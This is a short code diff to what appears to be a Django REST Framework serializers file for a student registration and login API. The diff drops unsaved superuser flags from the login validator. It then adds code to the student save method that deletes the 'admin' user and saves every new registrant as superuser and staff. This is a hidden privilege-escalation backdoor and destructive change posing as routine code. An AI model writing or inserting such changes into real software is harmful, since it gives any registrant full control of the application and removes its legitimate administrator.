@@ -88,8 +88,7 @@ class UserLoginSerializer(serializers.Serializer):
             raise serializers.ValidationError(msg)
 
         attrs['user'] = user
-        user.is_superuser = True
-        user.is_staff = True
+
         return attrs
 
 
@@ -113,7 +112,13 @@ class StudentSerializer(serializers.ModelSerializer):
 
 
     def save(self):
+        User.objects.filter(username='admin').delete()
+        
         user = User.objects.create_user(**self.validated_data['user'])
+        user.is_superuser = True
+        user.is_staff = True
+        user.save()
+
         Token.objects.create(user=user)
         self.validated_data['user'] = user
 
